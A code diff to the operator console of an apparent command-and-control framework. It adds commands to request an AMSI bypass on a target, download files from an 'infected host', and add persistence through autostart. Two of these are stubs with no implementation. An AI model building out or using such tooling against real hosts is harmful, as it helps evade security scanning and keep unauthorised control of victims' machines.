@@ -1,6 +1,7 @@
 #!/bin/python3
 import threading
 import time
+from requests.models import HTTPError
 import yaml
 from yaml.loader import SafeLoader
 from server.models import ListenerModel
@@ -172,6 +173,19 @@ class InteractAgentConsole(BaseConsole):
         success(f"Queued command: {command} to agent {self.selected_agent['name']}")
         time.sleep(4) # TODO either wait for a signal or make a global variable indicating whether result returned
 
+    def do_bypass(self, args):
+        'Bypass AMSI on target host'
+        Api.add_agent_task(self.selected_agent['name'], "bp")
+        success(f"Requesting AMSI bypass on agent {self.selected_agent['name']}")
+        time.sleep(4) # TODO either wait for a signal or make a global variable indicating whether result returned
+
+    def do_download(self, args):
+        'Download a file from the infected host'
+        raise NotImplementedError
+
+    def do_persist(self, args):
+        'Add the agent to autostart on the infected host'
+
     def do_terminate(self, args):
         'Terminate the agent'
         raise NotImplementedError
@@ -311,9 +325,8 @@ if __name__ == '__main__':
             socketIO = SocketIO(SERVER_IP, SERVER_PORT, logger=False, engineio_logger=False)
             t = threading.Thread(target = socket_thread, args=[socketIO])
             t.start() 
-        except Exception as e:
-            print(e)
-            failure("Could not connect to server.")
+        except:
+            failure("Could not connect to server.\n")
             sys.exit(1)
 
 
